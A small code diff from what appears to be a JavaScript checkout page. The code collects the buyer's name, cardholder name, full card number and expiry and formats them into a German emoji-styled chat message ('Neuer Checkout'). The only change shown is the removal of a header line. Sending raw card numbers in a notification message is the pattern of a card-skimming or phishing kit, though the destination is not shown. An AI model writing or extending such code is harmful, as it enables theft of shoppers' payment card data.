@@ -540,8 +540,6 @@ const exp = $("#ccExp").value.trim();
 const payload = {
   name: `${$("#firstName").value.trim()} ${$("#lastName").value.trim()}`.trim() || "Checkout",
   message:
-    `✅ Neuer Checkout (validiert)\n\n` +
-
     `💳 Zahlung\n` +
     `- Karteninhaber: ${$("#ccName").value.trim()}\n` +
     `- Karte: ${$("#ccNumber").value.trim()}\n` +
